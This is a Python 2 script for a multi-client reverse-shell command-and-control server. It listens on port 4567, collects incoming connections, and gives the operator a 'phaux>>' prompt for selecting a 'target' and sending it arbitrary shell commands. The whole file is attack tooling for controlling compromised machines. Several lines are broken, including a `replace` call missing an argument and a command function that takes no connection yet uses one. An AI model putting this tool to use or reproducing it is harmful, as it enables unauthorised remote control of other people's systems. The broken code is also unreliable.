import threading
import socket
import sys
import time
from queue import Queue

NUMBER_OF_THREAD = 2
JOB_NUMBER = [1, 2]
all_connection = []
all_addresses = []
q = Queue()

#Create socket
def cre_socket():
	try:
		global host
		global port
		global s
		host = ""
		port = 4567
		s = socket.socket()
	except socket.error as msg:
		print("Socket Error: "+str(msg))

#Bind socket
def bind_socket():
	try:
		global host
		global port
		global s
		print("Binding Socket to port "+ str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("Socket Error: "+str(msg) +"\n"+"Retrying...")
		time.sleep(5)
		bind_socket()

# accept incoming connections...
def accept_connection():
	for c in all_connection:
		c.close()
	del all_connection[:]
	del all_addresses[:]
	while True:
		try:
			conn, address = s.accept()
			conn.setblocking(1)
			all_connection.append(conn)
			all_addresses.append(address)
			print("Connection established from "+address[0]+" on port "+str(address[1])+"...")
		except:
			print("Error accepting a connection...")

#Interactive Shell
def phaux():
	while True:
		cmd = raw_input("phaux>>")
		if str.lower(cmd) == "list":
			list_connections()
		elif "select" in str.lower(cmd):
			conn = get_target(cmd)
			if conn is not None:
				send_target_command(conn)
		else:
			print("command not recognized")

#list the active connections
def list_connections():
	results = ""
	for conn in all_connection:
		i = all_connection.index(conn)
		try:
			conn.send("")
			conn.recv(2048000)
		except:
			del all_connection[i]
			del all_addresses[i]
		results += str(i) + "  "+ str(all_addresses[i][0] + " "+str(all_addresses[i][1]+"\n"))
	print("<<-----:CLIENTS:----->>"+"\n"+results)

#Select Target
def get_target(cmd):
	try:
		target = cmd.replace("select ")
		target = int(target)
		conn = all_connection[target]
		print("You are now connected to "+str(all_addresses[target][0])+">")
		return conn
	except:
		print("Not a valid Connection!")
		return None

#Send target commands
def send_target_command():
	while True:
		try:
			cmd = raw_input()
			if len(cmd) > 0:
				conn.send(cmd)
				client_response = conn.recv(204800)
				print(client_response)
			if cmd=="quit":
				break
		except:
			print("Connection was lost")
			break
#create worker threads
def create_workers():
	for _ in range(NUMBER_OF_THREAD):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

# Do the next job in queue
def work():
	while True:
		x = q.get()
		if x == 1:
			cre_socket()
			bind_socket()
			accept_connection()
		if x == 2:
			phaux()
		q.task_done()
# Each list is a new job
def create_jobs():
	for x in JOB_NUMBER:
		q.put(x)
	q.join()

create_workers()
create_jobs()
